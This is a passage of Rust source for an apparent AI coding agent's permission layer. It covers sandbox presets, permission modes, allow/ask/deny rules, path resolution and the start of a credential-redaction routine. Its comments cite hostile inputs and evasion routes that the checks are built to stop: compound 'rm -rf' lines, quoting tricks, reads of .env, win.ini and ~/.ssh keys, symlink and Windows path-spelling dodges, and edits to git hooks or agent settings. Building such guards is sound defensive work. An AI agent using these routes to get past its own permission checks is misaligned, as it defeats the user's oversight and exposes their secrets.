//! Policy and redaction.
//!
//! Two small things that are easy to get wrong in a way the user cannot see:
//!
//! 1. **A secret that reaches a log is leaked, not protected.** Redaction runs
//!    on the way out, at the point text is assembled, not at the point someone
//!    remembers to call it.
//! 2. **A sandbox is an enforcement level, not a promise.** The policy says
//!    what the host asked for and what it can actually enforce; the gap is
//!    reported, so a partial jail is never described as full.

pub mod jail;

use std::path::{Component, Path, PathBuf};
use std::sync::{Arc, Mutex};
use zerith_core::settings::Settings;
use zerith_core::shellparse;

/// How much a host can actually confine. Freedom is a level, and a level taken
/// by accident is worse than one taken on purpose.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Sandbox {
    /// Reads only; writes are denied.
    ReadOnly,
    /// Writes inside the workspace, nothing outside.
    WorkspaceWrite,
    /// No confinement. Only a user's explicit choice reaches here.
    DangerFullAccess,
}

impl Sandbox {
    pub fn as_str(self) -> &'static str {
        match self {
            Sandbox::ReadOnly => "read-only",
            Sandbox::WorkspaceWrite => "workspace-write",
            Sandbox::DangerFullAccess => "danger-full-access",
        }
    }

    pub fn parse(s: &str) -> Option<Self> {
        Some(match s {
            "read-only" => Sandbox::ReadOnly,
            "workspace-write" => Sandbox::WorkspaceWrite,
            "danger-full-access" => Sandbox::DangerFullAccess,
            _ => return None,
        })
    }
}

/// Whether the host can enforce the level it reports. Partial is a reported
/// fact, not a failure: a restricted token on Windows can block writes without
/// blocking every read.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Enforcement {
    Full,
    Partial,
}

impl Enforcement {
    pub fn as_str(self) -> &'static str {
        match self {
            Enforcement::Full => "full",
            Enforcement::Partial => "partial",
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Approval {
    /// Ask the user every time a write outside or a command is requested.
    Ask,
    /// Never ask; the user accepted the consequence once.
    Never,
}

/// A named bundle of (sandbox, approval). The default is the middle: writes in
/// the workspace, a prompt before anything leaves it.
#[derive(Debug, Clone, PartialEq)]
pub struct Preset {
    pub name: &'static str,
    pub sandbox: Sandbox,
    pub approval: Approval,
    pub description: &'static str,
}

pub const PRESETS: &[Preset] = &[
    Preset {
        name: "read-only",
        sandbox: Sandbox::ReadOnly,
        approval: Approval::Ask,
        description: "leitura apenas; nenhuma escrita e permitida",
    },
    Preset {
        name: "workspace-write",
        sandbox: Sandbox::WorkspaceWrite,
        approval: Approval::Ask,
        description: "escreve dentro do workspace; pede confirmacao para o resto",
    },
    Preset {
        name: "danger-full-access",
        sandbox: Sandbox::DangerFullAccess,
        approval: Approval::Never,
        description: "sem confinamento; use so quando o risco for aceito",
    },
];

pub fn preset(name: &str) -> Option<&'static Preset> {
    PRESETS.iter().find(|p| p.name == name)
}

/// What a caller asked to do, in the only shapes that matter for policy.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Action {
    Read(PathBuf),
    Write(PathBuf),
    /// A shell command, kept whole: classifying it after splitting on spaces
    /// is how a policy gets bypassed with quoting.
    Shell(String),
    Network(String),
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Verdict {
    Allow,
    /// Needs an interactive answer. The reason is shown to the user.
    Ask(String),
    Deny(String),
}

/// How eagerly the agent may act without asking. The preset is the ceiling
/// (what the sandbox permits at all); the mode is how often the user is asked
/// below it.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Mode {
    /// Reads inside the workspace run; writes, commands and network ask.
    Default,
    /// Writes and edits inside the workspace run without asking.
    AcceptEdits,
    /// Read-only: writes and shell (but read-only commands) are denied, not
    /// asked. The model leaves it through the `exit_plan_mode` tool.
    Plan,
    /// Nothing is asked: whatever would ask is denied. Only calls an `allow`
    /// rule, the preset or the mode already approve run.
    DontAsk,
    /// Everything runs except what the preset or a `deny`/`ask` rule stops
    /// (`bypassPermissions` in settings).
    Bypass,
}

impl Mode {
    /// Stable short name (CLI / env spelling).
    pub fn as_str(self) -> &'static str {
        match self {
            Mode::Default => "default",
            Mode::AcceptEdits => "accept-edits",
            Mode::Plan => "plan",
            Mode::DontAsk => "dont-ask",
            Mode::Bypass => "bypass",
        }
    }

    /// The name settings files use (`acceptEdits`, `dontAsk`,
    /// `bypassPermissions`).
    pub fn settings_name(self) -> &'static str {
        match self {
            Mode::Default => "default",
            Mode::AcceptEdits => "acceptEdits",
            Mode::Plan => "plan",
            Mode::DontAsk => "dontAsk",
            Mode::Bypass => "bypassPermissions",
        }
    }

    /// Accepts both spellings, any case: `acceptEdits` / `accept-edits`,
    /// `bypassPermissions` / `bypass`, `dontAsk` / `dont-ask`.
    pub fn parse(s: &str) -> Option<Self> {
        let k: String = s
            .chars()
            .filter(|c| !matches!(c, '-' | '_' | ' '))
            .collect::<String>()
            .to_lowercase();
        Some(match k.as_str() {
            "default" => Mode::Default,
            "acceptedits" => Mode::AcceptEdits,
            "plan" => Mode::Plan,
            "dontask" => Mode::DontAsk,
            "bypass" | "bypasspermissions" => Mode::Bypass,
            _ => return None,
        })
    }
}

/// A shared, switchable [`Mode`]. Clones see the same value, so the UI can
/// toggle the mode (or the plan gate can leave `plan`) while a turn runs.
/// A poisoned lock reads as `Default`, the mode that asks.
#[derive(Debug, Clone)]
pub struct ModeHandle(Arc<Mutex<Mode>>);

impl ModeHandle {
    pub fn new(mode: Mode) -> Self {
        Self(Arc::new(Mutex::new(mode)))
    }

    pub fn get(&self) -> Mode {
        self.0.lock().map(|m| *m).unwrap_or(Mode::Default)
    }

    pub fn set(&self, mode: Mode) {
        if let Ok(mut m) = self.0.lock() {
            *m = mode;
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum RuleKind {
    Allow,
    Ask,
    Deny,
}

/// One `tool(specifier)` rule, e.g. `shell(cargo test *)`, `read_file(./.env)`,
/// `write_file(src/**)`, `mcp__github__*` or `skill(deploy)`. A bare `tool`
/// matches every call of that tool; `*` in the tool name is a wildcard.
///
/// Shell specifiers match each simple command of a compound line (see
/// [`zerith_core::shellparse`]) after wrappers are stripped, and are **text
/// matching, not a security boundary**. Path specifiers are matched against
/// the normalised path (`..` resolved, symlinks resolved on the existing
/// prefix): relative to the workspace (`src/**`, `./.env`), absolute,
/// `~/`-relative, or by file name when the specifier has no `/` (`*.env`).
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Rule {
    pub kind: RuleKind,
    pub tool: String,
    pub pattern: Option<String>,
}

impl Rule {
    pub fn parse(kind: RuleKind, text: &str) -> Option<Self> {
        let text = text.trim();
        if text.is_empty() {
            return None;
        }
        let (tool, pattern) = match text.split_once('(') {
            Some((tool, rest)) => (tool.trim(), Some(rest.strip_suffix(')')?.to_string())),
            None => (text, None),
        };
        if tool.is_empty() {
            return None;
        }
        Some(Self {
            kind,
            tool: tool.to_string(),
            pattern,
        })
    }

    fn tool_matches(&self, tool: &str) -> bool {
        if self.tool.contains('*') {
            glob_match(&self.tool, tool, false)
        } else {
            self.tool == tool
        }
    }

    /// One piece of text (a simple command, a URL, a skill name).
    fn text_matches(&self, text: &str) -> bool {
        match &self.pattern {
            None => true,
            Some(pat) => command_glob(&pat.to_lowercase(), &text.to_lowercase()),
        }
    }

    /// Case-insensitive: on Windows `.ENV` is the same file, and a deny must
    /// not be dodged by casing.
    fn path_matches(&self, subject: &PathSubject) -> bool {
        let Some(pat) = &self.pattern else {
            return true;
        };
        let pat = expand_home(&pat.trim().to_lowercase().replace('\\', "/"));
        let anchored = pat.starts_with("./") || pat.starts_with('/') || pat.contains(':');
        let pat = pat.strip_prefix("./").unwrap_or(&pat);
        // `//abs` (Claude Code's spelling for an absolute path) is `/abs`.
        let abs_pat = pat
            .strip_prefix("//")
            .map_or(pat.to_string(), |p| format!("/{p}"));
        let abs = subject.abs.to_lowercase();
        let mut hit = glob_match(&abs_pat, &abs, true);
        if let Some(rel) = &subject.rel {
            hit |= glob_match(pat, &rel.to_lowercase(), true);
        }
        if !anchored && !pat.contains('/') {
            hit |= glob_match(pat, abs.rsplit('/').next().unwrap_or(&abs), true);
        }
        hit
    }

    fn describe(&self) -> String {
        match &self.pattern {
            Some(p) => format!("{}({p})", self.tool),
            None => self.tool.clone(),
        }
    }
}

/// `~/x` -> `<home>/x`, on already lowercased, slash-normalised text.
fn expand_home(p: &str) -> String {
    let e = expand_home_raw(p);
    if e == p {
        e
    } else {
        e.to_lowercase()
    }
}

/// `~/x`, `$HOME/x`, `${HOME}/x` -> `<home>/x`, case kept.
fn expand_home_raw(p: &str) -> String {
    let rest = match ["~", "$HOME", "${HOME}"]
        .iter()
        .find_map(|v| p.strip_prefix(v))
    {
        Some("") => "",
        Some(r) => match r.strip_prefix('/') {
            Some(r) => r,
            None => return p.to_string(),
        },
        None => return p.to_string(),
    };
    match std::env::var("USERPROFILE")
        .or_else(|_| std::env::var("HOME"))
        .ok()
        .map(|h| h.replace('\\', "/"))
    {
        Some(h) => format!("{}/{rest}", h.trim_end_matches('/')),
        None => p.to_string(),
    }
}

/// Command globs: `*` crosses everything; a trailing ` *` (or the legacy
/// `:*`) also matches the bare command, so `cargo test *` covers `cargo test`.
fn command_glob(pat: &str, text: &str) -> bool {
    let pat = match pat.strip_suffix(":*") {
        Some(p) => format!("{p} *"),
        None => pat.to_string(),
    };
    glob_match(&pat, text, false) || pat.strip_suffix(" *").is_some_and(|p| p == text)
}

/// `C:/Windows/System32/OpenSSH/ssh.exe -V` → `ssh -V`: a deny or ask rule
/// on `ssh *` must not be dodged by spelling the program's path or `.exe`.
fn bare_program(cmd: &str) -> String {
    let cmd = cmd.trim_start();
    let (prog, rest) = match cmd.strip_prefix('"') {
        Some(q) => q.split_once('"').unwrap_or((q, "")),
        None => cmd.split_once(char::is_whitespace).unwrap_or((cmd, "")),
    };
    let name = prog.rsplit(['/', '\\']).next().unwrap_or(prog);
    let lower = name.to_ascii_lowercase();
    let name = match [".exe", ".cmd", ".bat", ".com"]
        .iter()
        .find(|e| lower.ends_with(*e))
    {
        Some(e) => &name[..name.len() - e.len()],
        None => name,
    };
    format!("{name} {}", rest.trim_start())
        .trim_end()
        .to_string()
}

/// A path the way rules see it.
#[derive(Debug, Clone)]
struct PathSubject {
    /// Relative to the workspace, when inside it.
    rel: Option<String>,
    abs: String,
}

enum Subject {
    Path(PathSubject),
    /// A shell command line: analysed into simple commands.
    Shell(String),
    /// Any other single string (URL, skill name, MCP argument).
    Text(String),
}

/// A shell line in sh grammar that the parser cannot split with confidence.
fn shell_opaque(s: &Subject) -> bool {
    matches!(s, Subject::Shell(c)
        if shellparse::Dialect::NATIVE() == shellparse::Dialect::Sh && shellparse::sh_opaque(c))
}

impl Subject {
    fn text(&self) -> &str {
        match self {
            Subject::Path(p) => p.rel.as_deref().unwrap_or(&p.abs),
            Subject::Shell(s) | Subject::Text(s) => s,
        }
    }
}

/// Shell-style glob: `?` one char, `*` any run, `**` any run across `/`.
/// With `path = false`, `*` also crosses `/` (a command is not a path).
///
/// ponytail: plain backtracking, exponential on patterns with many stars;
/// fine for hand-written rules, swap for globset if patterns get large.
pub fn glob_match(pattern: &str, text: &str, path: bool) -> bool {
    let p: Vec<char> = pattern.chars().collect();
    let t: Vec<char> = text.chars().collect();
    glob_rec(&p, &t, path)
}

fn glob_rec(p: &[char], t: &[char], path: bool) -> bool {
    match p.first() {
        None => t.is_empty(),
        Some('*') => {
            let double = p.get(1) == Some(&'*');
            let rest = if double { &p[2..] } else { &p[1..] };
            // `**/` also matches zero directories.
            if double && rest.first() == Some(&'/') && glob_rec(&rest[1..], t, path) {
                return true;
            }
            for i in 0..=t.len() {
                if glob_rec(rest, &t[i..], path) {
                    return true;
                }
                if i < t.len() && path && !double && t[i] == '/' {
                    return false;
                }
            }
            false
        }
        Some('?') => !t.is_empty() && !(path && t[0] == '/') && glob_rec(&p[1..], &t[1..], path),
        Some(c) => !t.is_empty() && *c == t[0] && glob_rec(&p[1..], &t[1..], path),
    }
}

/// The active policy: one preset, one mode, rules, one workspace root.
#[derive(Debug, Clone)]
pub struct Policy {
    pub preset: &'static Preset,
    pub workspace: PathBuf,
    pub enforcement: Enforcement,
    /// The mode at construction. When a handle is attached, [`Policy::mode`]
    /// reads the handle instead, so a runtime toggle applies to the next call.
    pub mode: Mode,
    /// Checked in [`Policy::check_tool`]: deny > ask > allow, first match.
    pub rules: Vec<Rule>,
    handle: Option<ModeHandle>,
}

const MODE_NAMES: &str = "default, acceptEdits, plan, dontAsk, bypassPermissions";

impl Policy {
    /// A policy without rules, for hosts that configure it in code.
    pub fn new(preset: &'static Preset, mode: Mode, workspace: impl AsRef<Path>) -> Self {
        Self {
            preset,
            workspace: workspace.as_ref().to_path_buf(),
            // What the host can really enforce: see `jail::report`.
            enforcement: jail::report(preset.sandbox).enforcement,
            mode,
            rules: Vec::new(),
            handle: None,
        }
    }

    /// Attaches a live mode: the `mode` field is ignored from now on.
    pub fn with_handle(mut self, handle: ModeHandle) -> Self {
        self.handle = Some(handle);
        self
    }

    /// The mode in force right now.
    pub fn mode(&self) -> Mode {
        self.handle.as_ref().map_or(self.mode, ModeHandle::get)
    }

    /// The live handle, created on first use from the current mode. Clones of
    /// the policy made *after* this call share it.
    pub fn mode_handle(&mut self) -> ModeHandle {
        let mode = self.mode;
        self.handle
            .get_or_insert_with(|| ModeHandle::new(mode))
            .clone()
    }

    /// The mode a preset implied before modes existed, so `ZERITH_SANDBOX`
    /// alone keeps its old meaning: workspace-write auto-allows writes inside,
    /// danger-full-access never asks.
    pub fn default_mode(preset: &Preset) -> Mode {
        match preset.sandbox {
            Sandbox::ReadOnly => Mode::Default,
            Sandbox::WorkspaceWrite => Mode::AcceptEdits,
            Sandbox::DangerFullAccess => Mode::Bypass,
        }
    }

    /// Environment only (no settings files). Prefer [`Policy::from_settings`].
    pub fn from_env(workspace: impl AsRef<Path>) -> Result<Self, String> {
        Self::from_settings(&Settings::default(), workspace)
    }

    /// One policy from layered settings plus the environment.
    ///
    /// - `permissions.mode`: a sandbox preset (`read-only`, `workspace-write`,
    ///   `danger-full-access`) or a permission mode name (shorthand for
    ///   `default_mode`).
    /// - `permissions.default_mode`: `default`, `acceptEdits`, `plan`,
    ///   `dontAsk`, `bypassPermissions`. Absent: implied by the preset.
    /// - `permissions.allow/ask/deny`: rules, evaluated deny → ask → allow.
    /// - Environment wins over settings for `ZERITH_SANDBOX` / `ZERITH_MODE`;
    ///   `ZERITH_DENY` / `ZERITH_ASK` / `ZERITH_ALLOW` (`;`-separated) *add*
    ///   rules, so an env var can tighten but never remove a settings deny.
    ///
    /// An unknown preset, mode or malformed rule is an error rather than a
    /// silent fallback: a typo must not widen what the agent may do. The
    /// policy carries a live [`ModeHandle`] (see [`Policy::mode_handle`]).
    pub fn from_settings(settings: &Settings, workspace: impl AsRef<Path>) -> Result<Self, String> {
        Self::from_settings_with_env(settings, workspace, |k| std::env::var(k).ok())
    }

    /// [`Policy::from_settings`] with the environment injected.
    pub fn from_settings_with_env(
        settings: &Settings,
        workspace: impl AsRef<Path>,
        env: impl Fn(&str) -> Option<String>,
    ) -> Result<Self, String> {
        let env = |k: &str| env(k).filter(|v| !v.trim().is_empty());
        let perms = &settings.permissions;
        let sandbox_text = env("ZERITH_SANDBOX").unwrap_or_else(|| perms.mode.clone());
        let mut mode_text = env("ZERITH_MODE").or_else(|| perms.default_mode.clone());
        let preset_name = if preset(&sandbox_text).is_some() {
            sandbox_text
        } else if Mode::parse(&sandbox_text).is_some() {
            // `mode = "plan"`: a mode name where a preset was expected.
            mode_text.get_or_insert(sandbox_text);
            "workspace-write".to_string()
        } else {
            return Err(format!(
                "unknown sandbox preset {sandbox_text:?}; use one of: {}",
                PRESETS
                    .iter()
                    .map(|p| p.name)
                    .collect::<Vec<_>>()
                    .join(", ")
            ));
        };
        let preset = preset(&preset_name).ok_or("unknown sandbox preset")?;
        let mode = match mode_text {
            Some(m) => Mode::parse(&m)
                .ok_or_else(|| format!("unknown mode {m:?}; use one of: {MODE_NAMES}"))?,
            None => Self::default_mode(preset),
        };
        let mut policy = Self::new(preset, mode, workspace);
        for (list, kind, var) in [
            (&perms.deny, RuleKind::Deny, "ZERITH_DENY"),
            (&perms.ask, RuleKind::Ask, "ZERITH_ASK"),
            (&perms.allow, RuleKind::Allow, "ZERITH_ALLOW"),
        ] {
            for text in list {
                match Rule::parse(kind, text) {
                    Some(r) => policy.rules.push(r),
                    // A malformed deny silently ignored would widen access.
                    None => return Err(format!("regra de permissão inválida: {text:?}")),
                }
            }
            if let Some(extra) = env(var) {
                policy
                    .rules
                    .extend(extra.split(';').filter_map(|r| Rule::parse(kind, r)));
            }
        }
        policy.mode_handle();
        Ok(policy)
    }

    /// Decides one action from preset and mode, without tool rules.
    pub fn check(&self, action: &Action) -> Verdict {
        self.dont_ask(self.check_base(action))
    }

    /// `bypassPermissions` ("Bypass") asks nothing: whatever would prompt runs.
    /// A `deny` rule and a read-only preset still stop the call — a block is
    /// not a question.
    fn no_ask(&self, v: Verdict) -> Verdict {
        match v {
            Verdict::Ask(_) if self.mode() == Mode::Bypass => Verdict::Allow,
            other => other,
        }
    }

    /// In `dontAsk` anything that would ask is denied.
    fn dont_ask(&self, v: Verdict) -> Verdict {
        match v {
            Verdict::Ask(why) if self.mode() == Mode::DontAsk => Verdict::Deny(format!(
                "modo dontAsk: {why} (comandos e rede ficam de fora; use Livre para isso)"
            )),
            other => other,
        }
    }

    /// A line made only of read-only commands: allowed, unless it *reads* a
    /// file the read side would not allow — outside the workspace, or hit by a
    /// `read_file` deny rule (`type .env` used to walk past both).
    fn read_only_verdict(&self, cmd: &str) -> Verdict {
        let bypass = self.mode() == Mode::Bypass;
        for part in shellparse::analyze(cmd).inner {
            for path in shellparse::file_args(&part, shellparse::Dialect::NATIVE()) {
                let ps = self.path_subject(&path);
                if let Some(r) = self.rules.iter().find(|r| {
                    r.kind == RuleKind::Deny && r.tool_matches("read_file") && r.path_matches(&ps)
                }) {
                    return Verdict::Deny(format!("bloqueado pela regra {}", r.describe()));
                }
                if !bypass && !self.inside_workspace(&path) {
                    return Verdict::Ask(format!("leitura fora do workspace: {}", path.display()));
                }
            }
        }
        Verdict::Allow
    }

    fn check_base(&self, action: &Action) -> Verdict {
        let mode = self.mode();
        let bypass = mode == Mode::Bypass;
        match action {
            Action::Read(path) => {
                if bypass || self.inside_workspace(path) {
                    Verdict::Allow
                } else {
                    Verdict::Ask(format!("leitura fora do workspace: {}", path.display()))
                }
            }
            Action::Write(path) => {
                if self.preset.sandbox == Sandbox::ReadOnly {
                    return Verdict::Deny("preset read-only: no write is permitted".into());
                }
                if mode == Mode::Plan {
                    return Verdict::Deny("modo plan: nenhuma escrita é permitida".into());
                }
                let inside = self.inside_workspace(path);
                // These files decide what the agent may do next (or what runs
                // on the next commit): rewriting one is always the person's
                // call, never an automatic edit.
                if !bypass && self.is_own_control(path) {
                    return Verdict::Ask(format!(
                        "escrever {} (muda as permissões/configuração do projeto)",
                        path.display()
                    ));
                }
                // `dontAsk` never asks, so a write that would ask is one it
                // must simply do: inside the workspace it edits like
                // `acceptEdits` (the control files above still ask → deny).
                if bypass || (inside && matches!(mode, Mode::AcceptEdits | Mode::DontAsk)) {
                    Verdict::Allow
                } else if inside {
                    Verdict::Ask(format!("escrever {}", path.display()))
                } else {
                    Verdict::Ask(format!(
                        "{} is outside the workspace {}",
                        path.display(),
                        self.workspace.display()
                    ))
                }
            }
            Action::Shell(cmd) => {
                // Read-only commands never prompt, in any mode — but reading a
                // file is still a read: `type C:\Windows\win.ini` gets the
                // same path guard and the same deny rules as `read_file`.
                if shellparse::all_read_only(cmd) {
                    return self.read_only_verdict(cmd);
                }
                match mode {
                    Mode::Plan => Verdict::Deny("modo plan: shell não é permitido".into()),
                    Mode::Bypass => Verdict::Allow,
                    _ => Verdict::Ask(format!("shell: {cmd}")),
                }
            }
            Action::Network(url) => match mode {
                Mode::Bypass => Verdict::Allow,
                _ => Verdict::Ask(format!("network: {url}")),
            },
        }
    }

    /// Decides one tool call: a preset/mode deny is final, then rules
    /// (deny > ask > allow, first match), then the preset/mode verdict.
    /// `dontAsk` turns every remaining ask into a deny. An allow rule can
    /// never lift a deny, and a `deny` rule beats every mode, `bypass` too.
    pub fn check_tool(&self, tool: &str, action: &Action) -> Verdict {
        let base = self.check_base(action);
        if matches!(base, Verdict::Deny(_)) {
            return base;
        }
        let subject = match action {
            Action::Read(p) | Action::Write(p) => Subject::Path(self.path_subject(p)),
            Action::Shell(c) => Subject::Shell(c.clone()),
            Action::Network(c) => Subject::Text(c.clone()),
        };
        let v = self.rule_verdict(tool, &subject).unwrap_or(base);
        self.dont_ask(self.no_ask(v))
    }

    /// Rules only, for a tool call that has no [`Action`] (MCP tools, skills,
    /// plugins): `subject` is the text a specifier matches (a skill name, a
    /// URL, ...). `None`: no rule spoke, the caller's default stands.
    pub fn check_rules(&self, tool: &str, subject: Option<&str>) -> Option<Verdict> {
        let s = Subject::Text(subject.unwrap_or("").to_string());
        self.rule_verdict(tool, &s)
            .map(|v| self.dont_ask(self.no_ask(v)))
    }

    /// The first rule verdict, deny → ask → allow.
    fn rule_verdict(&self, tool: &str, subject: &Subject) -> Option<Verdict> {
        let rules = |kind: RuleKind| {
            self.rules
                .iter()
                .filter(move |r| r.kind == kind && r.tool_matches(tool))
        };
        let shell = match subject {
            Subject::Shell(c) => Some(shellparse::analyze(c)),
            _ => None,
        };
        // deny / ask: any piece of the command (or the whole line) matching
        // is enough.
        let any_hit = |r: &Rule| match (subject, &shell) {
            (Subject::Path(p), _) => r.path_matches(p),
            (Subject::Shell(whole), Some(a)) => {
                r.pattern.is_none()
                    || r.text_matches(whole)
                    || a.raw
                        .iter()
                        .chain(&a.inner)
                        .any(|p| r.text_matches(p) || r.text_matches(&bare_program(p)))
            }
            (Subject::Text(t), _) => r.text_matches(t),
            (Subject::Shell(_), None) => false,
        };
        if let Some(r) = rules(RuleKind::Deny).find(|r| any_hit(r)) {
            return Some(Verdict::Deny(format!(
                "bloqueado pela regra {}",
                r.describe()
            )));
        }
        if let Some(r) = rules(RuleKind::Ask).find(|r| any_hit(r)) {
            return Some(Verdict::Ask(format!(
                "regra {}: {}",
                r.describe(),
                subject.text()
            )));
        }
        // allow: a compound command is allowed only when *every* piece is, so
        // `shell(git *)` never blesses `git status && rm -rf x`.
        // With no allow rule at all there is no opinion: the preset's verdict
        // stands (`type C:\x` must still be able to ask).
        let allow: Vec<&Rule> = rules(RuleKind::Allow).collect();
        if allow.is_empty() {
            return None;
        }
        let allows = |t: &str| allow.iter().any(|r| r.text_matches(t));
        let mut read_only_deny: Option<Verdict> = None;
        let mut read_only_ask: Option<Verdict> = None;
        let mut other_denied_allow = false;
        let allowed = match (subject, &shell) {
            (Subject::Path(p), _) => allow.iter().any(|r| r.path_matches(p)),
            (Subject::Shell(_), Some(a)) => {
                if allow.iter().any(|r| r.pattern.is_none()) {
                    true
                } else if a.raw.is_empty() || shell_opaque(subject) {
                    // Pieces split from text the parser cannot read
                    // (`echo $'\'' ; rm x`) say nothing about what runs.
                    other_denied_allow = true;
                    false
                } else {
                    let mut all_ok = true;
                    for (raw, inner) in a.raw.iter().zip(&a.inner) {
                        if allows(raw) || allows(inner) || self.cd_inside(inner) {
                            continue;
                        }
                        if !shellparse::has_env_mutation(raw) && shellparse::is_read_only(inner) {
                            match self.read_only_verdict(inner) {
                                Verdict::Allow => {}
                                v @ Verdict::Deny(_) => {
                                    read_only_deny = Some(v);
                                    all_ok = false;
                                    break;
                                }
                                v @ Verdict::Ask(_) => {
                                    read_only_ask.get_or_insert(v);
                                    all_ok = false;
                                }
                            }
                        } else {
                            other_denied_allow = true;
                            all_ok = false;
                        }
                    }
                    all_ok
                }
            }
            (Subject::Text(t), _) => allows(t),
            (Subject::Shell(_), None) => false,
        };
        if let Some(v) = read_only_deny {
            return Some(v);
        }
        if !other_denied_allow {
            if let Some(v) = read_only_ask {
                return Some(v);
            }
        }
        allowed.then_some(Verdict::Allow)
    }

    /// Full verdict for a model-issued call of a built-in tool, from its name
    /// and JSON arguments: what `Registry::authorize` computes, for code
    /// (middleware) that does not hold the registry. `None` for tools this
    /// crate cannot turn into an [`Action`].
    pub fn check_call(&self, tool: &str, args: &serde_json::Value) -> Option<Verdict> {
        let action = self.action_for(tool, args)?;
        Some(self.check_tool(tool, &action))
    }

    /// Maps the built-in tools' arguments to an [`Action`].
    pub fn action_for(&self, tool: &str, args: &serde_json::Value) -> Option<Action> {
        let s = |k: &str| args.get(k).and_then(|v| v.as_str());
        let path = |p: &str| {
            let p = PathBuf::from(p);
            if p.is_absolute() {
                p
            } else {
                self.workspace.join(p)
            }
        };
        match tool {
            "read_file" | "list_dir" | "glob" | "grep" | "repo_map" => {
                Some(Action::Read(path(s("path").unwrap_or("."))))
            }
            "write_file" | "edit_file" | "multi_edit" => Some(Action::Write(path(s("path")?))),
            "shell" => Some(Action::Shell(s("command")?.to_string())),
            _ => None,
        }
    }

    /// A path normalised for rule matching.
    fn path_subject(&self, p: &Path) -> PathSubject {
        // A deny on `~/.ssh/*` must also see `~/.ssh/id_rsa` and `$HOME/...`.
        let text = p.to_string_lossy().replace('\\', "/");
        let expanded = PathBuf::from(expand_home_raw(&text));
        let resolved = self.resolve(&expanded);
        let rel = self
            .workspace
            .canonicalize()
            .ok()
            .and_then(|base| resolved.strip_prefix(&base).ok().map(slashes))
            .map(|r| r.trim_start_matches('/').to_string());
        PathSubject {
            rel,
            abs: slashes(&resolved),
        }
    }

    /// `..` and `.` resolved lexically, then symlinks resolved on the longest
    /// prefix that exists (including dangling symlinks), then the missing tail
    /// re-appended. A missing directory must not turn into "outside".
    pub fn resolve(&self, path: &Path) -> PathBuf {
        self.resolve_hops(path, 0).0
    }

    fn resolve_hops(&self, path: &Path, hops: usize) -> (PathBuf, bool) {
        const MAX_SYMLINK_HOPS: usize = 16;
        let path = if path.is_absolute() {
            path.to_path_buf()
        } else {
            self.workspace.join(path)
        };
        let mut clean = PathBuf::new();
        for c in path.components() {
            match c {
                // `link/..` is the parent of where the link points, as the OS
                // walks it, not the folder holding the link: resolve the real
                // path first, or a link to outside plus `..` reads as inside.
                Component::ParentDir => {
                    if let Ok(real) = clean.canonicalize() {
                        clean = real;
                    } else if hops < MAX_SYMLINK_HOPS
                        && std::fs::symlink_metadata(&clean)
                            .is_ok_and(|m| m.file_type().is_symlink())
                    {
                        let (resolved, ok) = self.resolve_hops(&clean, hops + 1);
                        if !ok {
                            return (resolved, false);
                        }
                        clean = resolved;
                    }
                    clean.pop();
                }
                Component::CurDir => {}
                other => clean.push(other.as_os_str()),
            }
        }
        if hops >= MAX_SYMLINK_HOPS {
            return (clean, false);
        }
        let mut tail = Vec::new();
        let mut probe = clean.as_path();
        loop {
            if let Ok(mut p) = probe.canonicalize() {
                for part in tail.iter().rev() {
                    p.push(part);
                }
                return (p, true);
            }
            if let Ok(meta) = std::fs::symlink_metadata(probe) {
                if meta.file_type().is_symlink() {
                    if let Ok(target) = std::fs::read_link(probe) {
                        let mut next = if target.is_absolute() {
                            target
                        } else {
                            probe.parent().map(|p| p.join(&target)).unwrap_or(target)
                        };
                        for part in tail.iter().rev() {
                            next.push(part);
                        }
                        return self.resolve_hops(&next, hops + 1);
                    }
                }
            }
            match (probe.file_name(), probe.parent()) {
                (Some(name), Some(parent)) => {
                    tail.push(name.to_os_string());
                    probe = parent;
                }
                _ => return (clean, true),
            }
        }
    }

    /// `cd <dir>` that stays inside the workspace runs nothing and moves only
    /// within what the agent may already touch, so it does not stop an allow
    /// rule from matching `cd sub && python -m pytest`. A `cd` out of the
    /// workspace, to `~`, `-` or a `$VAR` is not covered: the next piece
    /// would run somewhere the rule was not written for.
    fn cd_inside(&self, part: &str) -> bool {
        let t: Vec<&str> = part.split_whitespace().collect();
        match t.as_slice() {
            ["cd" | "pushd", dir] => {
                let d = dir.trim_matches(['"', '\'']);
                !d.starts_with(['~', '-', '$', '%'])
                    && self.inside_workspace(&self.workspace.join(d))
            }
            _ => false,
        }
    }

    pub fn inside_workspace(&self, path: &Path) -> bool {
        let Ok(base) = self.workspace.canonicalize() else {
            return false;
        };
        let (resolved, ok) = self.resolve_hops(path, 0);
        ok && resolved.starts_with(&base)
    }

    /// Files that decide the agent's own limits: the project's `.zerith/`
    /// settings, the git hooks that run on the next commit, `.git/config`
    /// (which can point git at other hooks) and `.mcp.json`.
    pub fn is_own_control(&self, path: &Path) -> bool {
        let abs = self.resolve(path);
        let Ok(base) = self.workspace.canonicalize() else {
            return false;
        };
        let Ok(rel) = abs.strip_prefix(&base) else {
            return false;
        };
        // Windows drops trailing dots/spaces of each component and opens the
        // main stream for `name::$DATA`: `.zerith./settings.toml`,
        // `.mcp.json.` and `.git/config:x` are the same files.
        let rel = slashes(rel)
            .to_ascii_lowercase()
            .split('/')
            .map(|c| {
                let c = c.split(':').next().unwrap_or(c);
                c.trim_end_matches(['.', ' '])
            })
            .collect::<Vec<_>>()
            .join("/");
        // `.git/config` runs code too: core.hooksPath, core.fsmonitor.
        rel.starts_with(".zerith/")
            || rel == ".mcp.json"
            || rel.starts_with(".git/hooks/")
            || rel == ".git/config"
    }
}

/// Forward slashes, no Windows verbatim prefix.
fn slashes(p: &Path) -> String {
    let s = p.to_string_lossy().replace('\\', "/");
    s.strip_prefix("//?/").unwrap_or(&s).to_string()
}

/// Replaces anything that looks like a credential with a fixed marker.
///
/// Deliberately blunt: a false positive costs one unreadable log line, a false
/// negative leaks a key into a file the user may share.
pub fn redact(text: &str) -> String {
    let text = &redact_pem(text);
    let mut out = String::with_capacity(text.len());
    // The word after a password keyword is the password, whatever it looks
    // like: `sshpass -p Admin@123`, `plink -pw x`, `password cipher x`,
    // `snmp-server community x`, `secret 5 $1$...`.
    let mut hide_next = false;
    let mut prev = String::new();
